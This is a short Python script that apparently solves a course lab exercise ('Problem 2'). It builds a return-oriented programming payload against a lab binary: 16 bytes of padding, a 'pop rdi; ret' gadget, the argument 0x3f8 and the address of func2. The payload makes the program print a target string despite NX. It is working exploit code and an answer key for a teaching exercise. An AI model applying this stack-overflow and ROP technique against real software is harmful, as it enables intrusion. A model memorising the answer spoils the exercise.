import struct

# Problem 2 Payload Generation
# Goal: Output 'Yes!I like ICS!'
# Method: ROP (Return Oriented Programming)
# The binary has NX enabled, so we cannot execute code on the stack.
# We need to jump to existing code.
# func2 (0x401216) prints the string IF the first argument (rdi) == 0x3f8.

# Stack Analysis of func:
# Buffer @ rbp-0x8
# Return Address @ rbp+0x8
# Offset = 16 bytes

padding = b'A' * 16

# Gadget: pop rdi; ret
# Found at 0x4012c7 in the binary
pop_rdi_ret = struct.pack('<Q', 0x4012c7)

# Argument: 0x3f8
arg1 = struct.pack('<Q', 0x3f8)

# Target: func2
# Address: 0x401216
func2_addr = struct.pack('<Q', 0x401216)

# Construct Payload
# 1. Fill buffer to return address
# 2. Overwrite return address with 'pop rdi; ret' gadget
# 3. Provide the value 0x3f8 (which will be popped into rdi)
# 4. Return to func2 (which will now see rdi = 0x3f8)
payload = padding + pop_rdi_ret + arg1 + func2_addr

with open('ans2.txt', 'wb') as f:
    f.write(payload)

print("ans2.txt generated.")
